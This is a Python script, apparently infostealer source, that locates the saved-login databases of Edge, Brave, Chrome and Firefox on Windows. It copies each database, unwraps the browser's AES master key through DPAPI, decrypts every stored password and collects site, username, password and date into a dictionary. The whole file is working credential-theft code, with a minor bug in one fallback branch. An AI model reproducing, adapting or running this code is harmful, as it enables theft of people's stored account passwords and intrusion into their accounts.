import os
import json
import base64
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
import json
import win32crypt
from Crypto.Cipher import AES

navegadores = {
    "Microsoft": "Edge",
    "BraveSoftware": "Brave-Browser",
    "Google": "Chrome",
    "Mozilla": "Firefox"
}

def chrome_datetime(time_in_mseconds):
    return datetime(1601,1,1) + timedelta(microseconds=time_in_mseconds)
    
def encryption_key(empresa, navegador):
    localState_path = os.path.join(os.environ['USERPROFILE'],
                       "AppData","Local",f"{empresa}",f"{navegador}",
                        "User Data","Local State")
    with open(localState_path, 'r', encoding="utf-8") as f:
        local_state_file=f.read()
        local_state_file=json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key

def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"

def getCreds():                            
    base_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local")
    data = {}  # Diccionario donde se almacenan los datos

    for empresa, navegador in navegadores.items():
        password_db_path = os.path.join(base_path, empresa, navegador, "User Data", "Default", "Login Data")
    
        if os.path.exists(password_db_path):
            print(f"Archivo encontrado para {navegador} en: {password_db_path}")
        
            dest_db = f"{navegador.lower()}_data.db"
            shutil.copyfile(password_db_path, dest_db)
        
            db = sqlite3.connect(dest_db)
            cursor = db.cursor()
        
            try:
                cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                encp_key = encryption_key(empresa, navegador)
            
                for row in cursor.fetchall():
                    site_url = row[0]
                    username = row[1]
                    password = decrypt_password(row[2], encp_key)
                    date_created = row[3]
                
                    if username or password:
                        if site_url not in data:
                            data[site_url] = []
                        data[site_url].append({
                            "username": username,
                            "password": password,
                            "date_created": str(chrome_datetime(date_created))
                        })
            except Exception as e:
                print(f"Error leyendo base de datos de {navegador}: {e}")
        
            cursor.close()
            db.close()
            os.remove(dest_db) # Eliminar solo el archivo actual
        else:
            print("No existe el archivo para el navegador: ",navegador)
    return data